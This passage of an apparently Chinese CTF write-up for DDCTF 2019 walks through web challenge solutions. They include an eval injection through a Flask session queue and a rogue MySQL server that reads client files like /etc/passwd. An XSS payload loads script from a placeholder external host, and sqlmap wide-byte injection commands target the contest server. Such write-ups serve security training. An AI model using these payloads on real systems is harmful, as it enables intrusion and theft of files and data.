    delete_robot(player_id,player_ticket)           #&#x4F7F;&#x7528;&#x4E3B;&#x8D26;&#x6237;&#x5220;&#x9664;id
    time.sleep(0.3)                                 #&#x77ED;&#x6682;&#x4F11;&#x7720;&#x907F;&#x514D;&#x88AB;&#x5C01;
</code></pre><h3 id="homebrew-event-loop"><a name="homebrew-event-loop" class="anchor-navigation-ex-anchor" href="#homebrew-event-loop"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.5. homebrew event loop</h3>
<p>&#x4F5C;&#x8005;&#xFF1A;<strong>12end</strong><br>&#x76F4;&#x63A5;&#x5BA1;&#x8BA1;&#x6E90;&#x7801;<br>&#x5BF9;&#x4E8E;&#x672C;&#x9898;&#x7684;&#x5B57;&#x4E32;&#x5207;&#x5272;&#x51FD;&#x6570;get_mid_str&#x8BF7;&#x81EA;&#x884C;&#x7406;&#x89E3;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x660E;&#x767D;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8BDD;&#xFF0C;&#x4E0B;&#x9762;&#x7684;payload&#x5C06;&#x96BE;&#x4EE5;&#x7406;&#x89E3;&#x539F;&#x7406;&#x3002;<br>&#x9996;&#x5148;&#xFF0C;eval&#x7684;&#x90A3;&#x90E8;&#x5206;&#x7531;&#x4E8E;&#x5206;&#x5272;&#x4E0D;&#x5F53;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6CE8;&#x91CA;&#x7B26;&#x5BFC;&#x81F4;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;?action:show_flag_function%23;&#x8BF7;&#x6C42;&#x6765;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#xFF08;&#x6CA1;&#x5375;&#x7528;&#x7684;&#x51FD;&#x6570;&#xFF09;:<br><img src="http://imgs.12end.xyz/ctf/ddctf2019/7.png" alt=""><br>&#x80FD;&#x591F;&#x6267;&#x884C;&#xFF0C;&#x5C31;&#x8BE5;&#x601D;&#x8003;&#x600E;&#x4E48;&#x8FDB;&#x4E00;&#x6B65;&#x5229;&#x7528;&#x4EE5;&#x83B7;&#x53D6;flag<br>&#x4E0D;&#x96BE;&#x770B;&#x51FA;&#xFF0C;&#x672C;&#x9898;&#x9760;&#x961F;&#x5217;&#x63A7;&#x5236;&#x51FD;&#x6570;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;&#x4E14;&#x552F;&#x4E00;&#x83B7;&#x53D6;flag&#x7684;&#x51FD;&#x6570;&#x88AB;ban&#x6389;&#x4E86;&#x8FD4;&#x56DE;&#x503C;:  </p>
<pre class="language-"><code>def show_flag_function(args):               #&#x88AB;ban&#x7684;&#x8F93;&#x51FA;flag&#x51FD;&#x6570;&#xFF0C;&#x6CA1;&#x6709;return flag
    flag = args[0]
    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
    return &apos;You naughty boy! ;) <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>&apos;
</code></pre><p>&#x4ED4;&#x7EC6;&#x89C2;&#x5BDF;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x8FD8;&#x53EF;&#x4EE5;&#x4ECE;&#x4E24;&#x4E2A;&#x5730;&#x65B9;&#x83B7;&#x53D6;flag&#xFF1A;  </p>
<ul>
<li>1.&#x76F4;&#x63A5;&#x6267;&#x884C;FLAG()</li>
<li>2.&#x6267;&#x884C;get_flag_handler&#x4F1A;&#x901A;&#x8FC7;trigger_event(&apos;func:show_flag;&apos; + FLAG())&#x5C06;flag&#x7684;&#x503C;&#x5165;&#x961F;</li>
</ul>
<p>&#x6211;&#x6700;&#x5F00;&#x59CB;&#x60F3;&#x5230;&#x7684;&#x65B9;&#x6CD5;&#x4FBF;&#x662F;&#x76F4;&#x63A5;&#x6267;&#x884C;FLAG()&#xFF0C;&#x5728;flask&#x4E2D;&#xFF0C;&#x89C6;&#x56FE;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x4F1A;&#x88AB;&#x4F20;&#x8F93;&#x5230;&#x524D;&#x7AEF;&#x4EE5;&#x4F9B;&#x5C55;&#x793A;&#xFF0C;&#x8FD9;&#x9053;&#x9898;&#x7684;&#x89C6;&#x56FE;&#x51FD;&#x6570;entry_point&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x662F;execute_event_loop(),&#x800C;execute_event_loop&#x7684;&#x8FD4;&#x56DE;&#x503C;resp&#x662F;&#x7531;&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#x4E2D;&#x6267;&#x884C;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;ret_val&#x51B3;&#x5B9A;&#x7684;&#xFF0C;&#x8FD9;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x6267;&#x884C;show_flag_function&#x51FD;&#x6570;&#x4F1A;&#x5C06;&#x8FD4;&#x56DE;&#x503C;&#x6253;&#x5370;&#x5728;&#x524D;&#x7AEF;&#x7684;&#x539F;&#x56E0;&#x3002;&#x4EE5;&#x6B64;&#x63A8;&#x51FA;&#xFF0C;&#x5982;&#x679C;&#x80FD;&#x76F4;&#x63A5;&#x6267;&#x884C;FLAG()&#xFF0C;flag&#x4E5F;&#x4F1A;&#x88AB;&#x6253;&#x5370;&#x51FA;&#x6765;&#x3002;&#x5230;&#x6B64;&#x4E3A;&#x6B62;&#x4F3C;&#x4E4E;&#x4E00;&#x5E06;&#x98CE;&#x987A;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x4E0A;&#x9762;&#x7684;&#x8BF7;&#x6C42;&#x7A0D;&#x4F5C;&#x4FEE;&#x6539;&#x4E0D;&#x5C31;&#x53EF;&#x4EE5;&#x62FF;flag&#x4E86;&#x5417;&#xFF1F;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5;&#x5374;404&#x4E86;&#x3002;  </p>
<p>404&#x7684;&#x539F;&#x56E0;&#x5728;&#x8FD9;&#x91CC;&#xFF1A;  </p>
<pre class="language-"><code>try:
    event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))       #eval&#x9020;&#x6210;&#x7684;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x4ECE;&#x8FD9;&#x91CC;&#x4E0B;&#x624B;
    ret_val = event_handler(args)                                       #&#x83B7;&#x53D6;&#x8FD4;&#x56DE;&#x503C;
</code></pre><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7B2C;&#x4E09;&#x884C;&#x7684;&#x6267;&#x884C;&#x51FD;&#x6570;&#x662F;&#x5E26;&#x6709;&#x53C2;&#x6570;&#x7684;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x8BD5;&#x56FE;&#x5411;&#x4E00;&#x4E2A;&#x4E0D;&#x9700;&#x8981;&#x53C2;&#x6570;&#x7684;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x65F6;&#xFF0C;python&#x4F1A;&#x629B;&#x51FA;&#x53C2;&#x6570;&#x8FC7;&#x591A;&#x7684;&#x9519;&#x8BEF;&#xFF0C;try&#x5931;&#x8D25;&#x540E;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;404&#x3002;<br>&#x601D;&#x8003;&#x4E86;&#x5F88;&#x4E45;&#x4E5F;&#x6CA1;&#x6709;&#x60F3;&#x51FA;&#x80FD;&#x591F;&#x7ED5;&#x8FC7;&#x8FD9;&#x91CC;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x5982;&#x679C;&#x7ED5;&#x8FC7;&#x53BB;&#x4E86;&#xFF0C;&#x8FD9;&#x5E94;&#x5F53;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x9884;&#x671F;&#x89E3;&#x3002;  </p>
<p>&#x7ECF;@Smi1e&#x5E08;&#x5085;&#x7684;&#x6307;&#x5BFC;&#xFF0C;&#x77E5;&#x9053;&#x8FD9;&#x9053;&#x9898;&#x8981;&#x5229;&#x7528;flask&#x7684;&#x5BA2;&#x6237;&#x7AEF;session&#x5BFC;&#x81F4;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x3002;<br>&#x76F8;&#x5173;&#x6587;&#x7AE0;&#xFF1A;<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank">&#x5BA2;&#x6237;&#x7AEF; session &#x5BFC;&#x81F4;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;</a><br>&#x597D;&#x5DE7;&#x4E0D;&#x5DE7;&#xFF0C;&#x9898;&#x4E2D;&#x7684;&#x6267;&#x884C;&#x961F;&#x5217;&#x6070;&#x5DE7;&#x662F;&#x5B58;&#x50A8;&#x5728;session&#x4E2D;&#x7684;&#x3002;<br>&#x90A3;&#x4E48;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5229;&#x7528;&#x4E0A;&#x9762;&#x63D0;&#x5230;&#x7684;&#x7B2C;&#x4E8C;&#x70B9;&#x6765;&#x5C06;flag&#x503C;&#x5165;&#x961F;&#xFF0C;&#x89E3;&#x5BC6;&#x6B64;&#x65F6;&#x7684;session&#x5373;&#x53EF;&#x3002;<br>payload:<code>?action:trigger_event%23;action:buy;5%23action:get_flag;</code>  </p>
<h3 id="mysql&#x5F31;&#x53E3;&#x4EE4;"><a name="mysql&#x5F31;&#x53E3;&#x4EE4;" class="anchor-navigation-ex-anchor" href="#mysql&#x5F31;&#x53E3;&#x4EE4;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.6. mysql&#x5F31;&#x53E3;&#x4EE4;</h3>
<p>&#x4F5C;&#x8005;&#xFF1A;<strong>12end</strong><br>&#x63D0;&#x793A;&#x5148;&#x90E8;&#x7F72;agent.py&#x518D;&#x8FDB;&#x884C;&#x5F31;&#x53E3;&#x4EE4;&#x626B;&#x63CF;
&#x5728;agent.py&#x7684;&#x54CD;&#x5E94;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x8FD4;&#x56DE;&#x4E86;<code>result</code>&#x7684;&#x54CD;&#x5E94;&#x5185;&#x5BB9;&#xFF0C;<code>result</code>&#x7684;&#x503C;&#x6765;&#x6E90;&#x4E8E;<code>_func</code>&#x51FD;&#x6570;&#xFF1A;</p>
<pre class="language-"><code>class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        ....
        ...
        result = self._func()
        self.wfile.write(json.dumps(result))
&#x7814;&#x7A76;&#x4E00;&#x4E0B;_func()&#xFF1A;

def _func(self):
    netstat = Popen([&apos;netstat&apos;, &apos;-tlnp&apos;], stdout=PIPE)  //&#x6267;&#x884C;netstat&#x5B50;&#x8FDB;&#x7A0B;&#xFF0C;&#x83B7;&#x53D6;&#x5728;&#x76D1;&#x542C;&#x7684;tcp&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x540D;&#x7B49;&#x4FE1;&#x606F;&#x5E76;&#x8F93;&#x5165;&#x81F3;pipe
    netstat.wait()              //&#x7B49;&#x5F85;&#x5B50;&#x8FDB;&#x7A0B;&#x7ED3;&#x675F;

    ps_list = netstat.stdout.readlines()        //&#x9010;&#x884C;&#x8BFB;&#x53D6;
    result = []
    for item in ps_list[2:]:
        tmp = item.split()
        Local_Address = tmp[3]
        Process_name = tmp[6]
        tmp_dic = {
            &apos;local_address&apos;: Local_Address,
            &apos;Process_name&apos;: Process_name
        }
        result.append(tmp_dic)  //&#x5411;result&#x4E2D;&#x589E;&#x52A0;&#x5B57;&#x5178;&#x5143;&#x7D20;&#xFF0C;&#x5305;&#x542B;&#x7740;&#x8FDB;&#x7A0B;&#x7684;&#x6E90;&#x5730;&#x5740;&#x53CA;&#x8FDB;&#x7A0B;&#x540D;&#x79F0;
    return result
</code></pre><p>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x6574;&#x4E2A;&#x7A0B;&#x5E8F;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x8FD4;&#x56DE;tcp&#x670D;&#x52A1;&#x8FDB;&#x7A0B;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x731C;&#x6D4B;&#x9898;&#x76EE;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x4E0B;&#x79F0;&#x9776;&#x673A;&#xFF09;&#x662F;&#x4EE5;&#x6B64;&#x5224;&#x65AD;mysql&#x662F;&#x5426;&#x5728;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x4E0B;&#x79F0;&#x5BA2;&#x6237;&#x673A;&#xFF09;&#x4E0A;&#x8FD0;&#x884C;&#x3002;  </p>
<p>&#x5C1D;&#x8BD5;&#x4E00;&#x756A;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x672A;&#x5728;&#x5BA2;&#x6237;&#x673A;&#x4E0A;&#x8FD0;&#x884C;agent.py&#x65F6;&#xFF0C;&#x4F1A;&#x63D0;&#x793A;&#xFF1A;  </p>
<p>&#x800C;&#x6B64;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x5BA2;&#x6237;&#x673A;&#x7684;Mysql&#x662F;&#x5F00;&#x542F;&#x7740;&#x7684;&#x3002;  </p>
<p>&#x540C;&#x6837;&#xFF0C;&#x5C06;&#x5BA2;&#x6237;&#x673A;&#x7684;Mysql&#x5173;&#x95ED;&#xFF0C;agent.py&#x8FD0;&#x884C;&#xFF0C;&#x4F1A;&#x63D0;&#x793A;&#x672A;&#x626B;&#x63CF;&#x5230;&#x5F31;&#x5BC6;&#x7801;&#x3002;mysql&#x7684;&#x8FDB;&#x7A0B;&#x540D;&#x79F0;&#x662F;mysqld&#xFF0C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x4FEE;&#x6539;<code>self.wfile.write(json.dumps(result))</code>&#x4E3A;mysqld&#x53EF;&#x4EE5;&#x6210;&#x529F;&#x7ED5;&#x8FC7;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5224;&#x65AD;&#x3002;  </p>
<p>&#x7ED5;&#x8FC7;&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x5462;&#xFF1F;<br>&#x796D;&#x51FA;&#x6211;@Smi1e&#x5E08;&#x5085;&#x7684;&#x4E00;&#x7BC7;blog&#xFF1A;<a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank">MySQL LOAD DATA &#x8BFB;&#x53D6;&#x5BA2;&#x6237;&#x7AEF;&#x4EFB;&#x610F;&#x6587;&#x4EF6;</a>  </p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/106488" target="_blank">&#x5982;&#x4F55;&#x5229;&#x7528;MySQL LOCAL INFILE&#x8BFB;&#x53D6;&#x5BA2;&#x6237;&#x7AEF;&#x6587;&#x4EF6;</a></p>
</blockquote>
<p>&#x5927;&#x610F;&#x662F;&#x6307;,&#x4E3B;&#x673A;A&#x8FDE;&#x63A5;&#x8FDC;&#x7A0B;mysql&#x670D;&#x52A1;&#x5668;&#x4E3B;&#x673A;B&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x8BF7;&#x6C42;&#x90FD;&#x662F;&#x660E;&#x6587;&#x4F20;&#x8F93;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x4E3B;&#x673A;B&#x4E0A;&#x4F2A;&#x9020;&#x4EFB;&#x610F;&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x7ED9;&#x4E3B;&#x673A;A&#x3002;
&#x800C;&#x5728;MySQL&#x4E2D;&#xFF0C;LOAD DATA LOCAL INFLIE&#x8BED;&#x53E5;&#x4F1A;&#x5C06;&#x672C;&#x5730;&#x5185;&#x5BB9;&#x4F20;&#x8F93;&#x7ED9;&#x8FDC;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6267;&#x884C;LOAD DATA LOCAT INFILE&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;  </p>
<p><code>&#x672C;&#x5730;&#x5411;&#x8FDC;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x5305;&#xFF0C;&#x8BF7;&#x6C42;&#x5305;&#x542B;&#x8981;&#x4F20;&#x8F93;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;</code>-&gt;
<code>&#x8FDC;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x54CD;&#x5E94;&#xFF0C;&#x54CD;&#x5E94;&#x5185;&#x5BB9;&#x4E3A;&#x8BF7;&#x6C42;&#x5305;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;</code>-&gt;
<code>&#x672C;&#x5730;&#x53D1;&#x9001;&#x54CD;&#x5E94;&#x5305;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;</code>  </p>
<p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F2A;&#x9020;&#x54CD;&#x5E94;&#x7684;&#x4EFB;&#x610F;&#x5185;&#x5BB9;&#xFF0C;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x80FD;&#x591F;&#x8BFB;&#x53D6;&#x5230;&#x8FDE;&#x63A5;&#x8005;&#x672C;&#x5730;&#x7684;&#x4EFB;&#x610F;&#x6587;&#x4EF6;</p>
<blockquote>
<p>&#x6700;&#x91CD;&#x8981;&#x7684;&#x662F;&#x4F2A;&#x9020;&#x7684;&#x670D;&#x52A1;&#x7AEF;&#x53EF;&#x4EE5;&#x5728;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x56DE;&#x590D;&#x4E00;&#x4E2A;file-transfer &#x8BF7;&#x6C42;&#xFF0C;&#x4E0D;&#x4E00;&#x5B9A;&#x975E;&#x8981;&#x662F;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;LOAD DATA LOCAL&#x6570;&#x636E;&#x5305;&#x7684;&#x65F6;&#x5019;&#x3002;&#xFF08;&#x524D;&#x63D0;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x5DF2;&#x7ECF;&#x8BF7;&#x6C42;&#x4E86;&#x4EFB;&#x610F;&#x5185;&#x5BB9;&#xFF0C;&#x5E78;&#x8FD0;&#x7684;&#x65F6;&#xFF0C;&#x7EDD;&#x5927;&#x591A;&#x6570;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x4F1A;&#x5728;&#x8FDE;&#x63A5;mysql&#x6210;&#x529F;&#x65F6;&#x53D1;&#x9001;&#x4E00;&#x7CFB;&#x5217;&#x7C7B;&#x4F3C;@@version&#x7684;&#x521D;&#x59CB;&#x5316;&#x8BF7;&#x6C42;&#xFF09;
&#x4E0D;&#x8FC7;&#x5982;&#x679C;&#x60F3;&#x8981;&#x5229;&#x7528;&#x6B64;&#x7279;&#x6027;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5FC5;&#x987B;&#x5177;&#x6709;CLIENT_LOCAL_FILES&#x5373;(Can use LOAD DATA LOCAL)&#x5C5E;&#x6027;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x8981;&#x5728;&#x8FDE;&#x63A5;mysql&#x7684;&#x65F6;&#x5019;&#x52A0;&#x4E0A;--enable-local-infile&#x3002;  </p>
</blockquote>
<p>&#x56DE;&#x5F52;&#x6B63;&#x9898;&#xFF0C;&#x4E3A;&#x4E86;&#x4E0E;&#x9776;&#x673A;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x8BA9;&#x9776;&#x673A;&#x8BA4;&#x4E3A;&#x5DF2;&#x7ECF;&#x8FDE;&#x63A5;&#x4E0A;&#x4E86;&#x6211;&#x4EEC;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x5411;&#x5176;&#x54CD;&#x5E94;greeting&#x4EE5;&#x53CA;authok&#x7684;&#x6570;&#x636E;&#x5305;&#x5373;&#x53EF;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x53D1;&#x9001;&#x7CBE;&#x5FC3;&#x6784;&#x9020;&#x597D;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x8BA9;&#x9776;&#x673A;&#x628A;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x7684;&#x6587;&#x4EF6;&#x7ED9;&#x54CD;&#x5E94;&#x8FC7;&#x6765;<br>&#x5728;github&#x4E0A;&#x5DF2;&#x6709;&#x76F8;&#x5173;&#x7684;&#x9879;&#x76EE;&#x4EE5;&#x90E8;&#x7F72;&#x8FD9;&#x6837;&#x7684;&#x6076;&#x610F;mysql&#x670D;&#x52A1;&#x5668;&#xFF1A;<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank">Rogue-MySql-Server</a><br>&#x5728;&#x8FD9;&#x91CC;&#x4EE5;python&#x7684;&#x811A;&#x672C;&#x4E3A;&#x4F8B;&#xFF1A;  </p>
<p>&#x4FEE;&#x6539;26&#x884C;&#x7684;filelist&#x4E3A;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x8BFB;&#x53D6;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x5047;&#x8BBE;&#x4E3A;&#x2019;/etc/passwd&#x2019;&#xFF0C;&#x5148;&#x5F00;&#x542F;agent.py&#x6B3A;&#x9A97;&#x9776;&#x673A;&#xFF0C;&#x544A;&#x8BC9;&#x5B83;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x5F00;&#x542F;&#x4E86;mysqld&#x8FDB;&#x7A0B;&#xFF0C;&#x518D;&#x5F00;&#x542F;&#x8FD9;&#x4E2A;poc.py&#xFF0C;&#x7136;&#x540E;&#x8BA9;&#x9776;&#x673A;&#x626B;&#x63CF;&#x4E00;&#x4E0B;&#x6211;&#x4EEC;&#x7684;&#x5BA2;&#x6237;&#x673A;&#xFF1A;<br><img src="http://imgs.12end.xyz/ctf/ddctf2019/9.png" alt="">
&#x6700;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#x4F1A;&#x5728;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x7684;mysql.log&#xFF1A;<br><img src="http://imgs.12end.xyz/ctf/ddctf2019/10.png" alt=""><br>root&#x7528;&#x6237;&#x7684;mysql&#x64CD;&#x4F5C;&#x4E00;&#x822C;&#x8BB0;&#x5F55;&#x5728;&#xFF1A;<code>~/.mysql_history</code>&#x4E2D;&#xFF0C;&#x8BFB;&#x53D6;&#x4E00;&#x4E0B;&#x5C31;&#x53EF;&#x4EE5;&#x62FF;&#x5230;flag</p>
<h3 id="&#x6B22;&#x8FCE;&#x62A5;&#x540D;ddctf"><a name="&#x6B22;&#x8FCE;&#x62A5;&#x540D;ddctf" class="anchor-navigation-ex-anchor" href="#&#x6B22;&#x8FCE;&#x62A5;&#x540D;ddctf"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.7. &#x6B22;&#x8FCE;&#x62A5;&#x540D;DDCTF</h3>
<p>&#x4F5C;&#x8005;&#xFF1A;<strong>evoA</strong><br>&#x592A;&#x8111;&#x6D1E;&#x4E86;&#xFF0C;&#x592A;&#x8111;&#x6D1E;&#x4E86;&#xFF0C;&#x592A;&#x8111;&#x6D1E;&#x4E86;<br>&#x4E00;&#x76F4;&#x4EE5;&#x4E3A;&#x662F;sql&#xFF0C;&#x76F4;&#x5230;&#x7528;xss&#x7684;exp&#x53D1;&#x73B0;&#x6709;bot&#x8BF7;&#x6C42;<br>&#x5728;&#x62A5;&#x540D;&#x9875;&#x9762;&#x7684;&#x5907;&#x6CE8;&#x91CC;&#x53EA;&#x5BF9;sql&#x8FDB;&#x884C;&#x4E00;&#x70B9;&#x8FC7;&#x6EE4;&#xFF0C;&#x4F46;&#x662F;xss&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x8FC7;&#x6EE4;&#xFF0C;&#x76F4;&#x63A5;<code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>//xxxx</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code>&#x5373;&#x53EF;<br>&#x901A;&#x8FC7;xss&#x5E73;&#x53F0;&#x8BFB;&#x9875;&#x9762;&#x6E90;&#x7801;&#x8BFB;&#x5230;&#x4E00;&#x4E2A;&#x63A5;&#x53E3;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419111202-e6ca6fe6-6250-1.png" alt=""><br><code>http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=</code>
&#x6D4B;&#x4E86;&#x534A;&#x5929;&#x6CE8;&#x5165;&#x8FD8;&#x662F;&#x6CA1;&#x4E1C;&#x897F;&#xFF0C;&#x7ED3;&#x679C;&#x4E00;&#x5806;&#x4EBA;&#x505A;&#x51FA;&#x6765;&#x540E;&#x91CD;&#x65B0;&#x590D;&#x6D4B;&#xFF0C;&#x6CE8;&#x610F;&#x5230;&#x8FD4;&#x56DE;&#x5934;GBK<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419111216-ef4871e0-6250-1.png" alt=""><br>&#x7136;&#x540E;&#x5C31;&#x662F;&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;<br>SQLmap&#x52A0;tamper&#x90FD;&#x53EF;&#x4EE5;&#x8DD1;  </p>
<pre class="language-"><code>#&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x540D;  
python2 sqlmap.py -u &quot;http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1&quot; --tamper unmagicquotes --dbs --hex

#&#x6570;&#x636E;&#x5E93;&#x8868;&#x540D;  
python2 sqlmap.py -u &quot;http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1&quot; --tamper unmagicquotes --hex -D &quot;ctfdb&quot; --tables

#&#x5B57;&#x6BB5;&#x540D;  
python2 sqlmap.py -u &quot;http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1&quot; --tamper unmagicquotes --hex -D &quot;ctfdb&quot; -T &quot;ctf_fhmHRPL5&quot; --columns

#flag  
python2 sqlmap.py -u &quot;http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1&quot; --tamper unmagicquotes --hex --sql-shell
sql-shell&gt; select ctf_value from ctfdb.ctf_fhmHRPL5;
</code></pre><p>&#x5E38;&#x89C4;&#x64CD;&#x4F5C;&#xFF0C;&#x6CE8;&#x5E93;&#x540D;&#xFF0C;&#x8868;&#x540D;&#xFF0C;&#x5B57;&#x6BB5;&#x540D;&#xFF08;TCL&#xFF09;&#x505A;&#x7684;&#x65F6;&#x5019;&#x60F3;&#x7684;&#x592A;&#x590D;&#x6742;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x7684;sqlmap&#x6700;&#x540E;&#x8FD9;&#x91CC;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;--dump&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x6267;&#x884C;&#x4E86;--sql-shell&#x81EA;&#x5B9A;&#x4E49;sql&#x547D;&#x4EE4;&#x6700;&#x7EC8;&#x62FF;&#x7684;flag<br>sqlmap&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;&#x81EA;&#x5E26;&#x7684;tamper&#x662F;<code>unmagicquotes</code><br>&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x8FC7;&#x6EE4;&#x4E86;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7528;--hex&#x53C2;&#x6570;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x4E3A;0x&#x5F00;&#x5934;&#x7684;16&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x907F;&#x5F00;&#x5F15;&#x53F7;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419111259-094dde36-6251-1.png" alt=""></p>
<h3 id="&#x518D;&#x6765;1&#x676F;java"><a name="&#x518D;&#x6765;1&#x676F;java" class="anchor-navigation-ex-anchor" href="#&#x518D;&#x6765;1&#x676F;java"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.8. &#x518D;&#x6765;1&#x676F;Java</h3>
